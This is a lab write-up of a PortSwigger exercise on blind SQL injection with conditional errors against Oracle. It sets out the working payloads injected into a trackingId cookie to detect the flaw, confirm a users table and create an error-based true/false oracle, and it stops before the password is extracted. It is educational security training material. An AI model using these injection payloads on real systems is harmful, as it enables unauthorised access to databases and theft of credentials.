# Write-up: Blind SQL injection with conditional errors   
![Homepage](img/01-homepage.png)  
Lab-link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors  
Difficulty: Practitioner   
Status: Solved  

## Lab description  
![Lab description](img/02-lab-description.png) 

## Objectives 
Retrieve the password of `administrator` user and log into their account  

## Background  
### Blind SQL injection  
Blind SQL injection occurs when an application is vulnerable to SQL injection, but the results of the injected query are not directly displayed in the response.  

### `LENGTH()`  
`LENGTH()` returns the number of characters in a string.  

### `SUBSTRING()`  
`SUBSTRING()` extracts a specific part of a string using the following syntax:  
SUBSTRING(string, start, length)    
For example: `SUBSTRING(password,1,1)`  
`password`: the string to extract characters from.  
`1` (second parameter): the starting position of the character to extract. Positions start from 1.  
`1` (third parameter): the number of characters to extract.   

###[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
#### Use || on Oracle  
#### Use CASE 
### Oracle-specific note
On **Oracle** databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.  
There is a built-in table on **Oracle** called `dual` which you can use for this purpose.  
**Example query:** 
```text
UNION SELECT 'abc' FROM dual
```

## Steps   
### 1. Establish a baseline  
Firstly, I chose the **Pets** category
In Burp Suite, I intercepted this request and sent it to Repeater  
![Request](img/03-request.png)   
The important parameter in this lab is the `trackingId` cookie

### 2. Confirm the parameter is vulnerable to blind SQL injection   
To determine whether `trackingId` could be manipulated, I injected 2 payloads:  
`'||(SELECT '' FROM dual)||'`: this got status `200 OK`. While
`'||(SELECT '' FROM dualhdb)||'` got `Internal Server Error`  

### 3. Confirm that `users` table exist  
To confirm that the users table exists, I injected:
```text
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
The response was `200 OK`, indicating that the users table exists.  
`ROWNUM = 1` is used to make sure that the subquery returns at most one row.  

### 4. Test conditional errors  
I used a **CASE** statement to trigger a database error only when a specific condition is true.  
First, I tested a true condition:  
```text
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
This returned `Internal Server Error`
Then, I changed the condition to:   
```text
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
This returned `200 OK`    
This confirms that I could use the error response as a true/false indicator:
`500 Internal Server Error` condition is true  
`200 OK` condition is false   
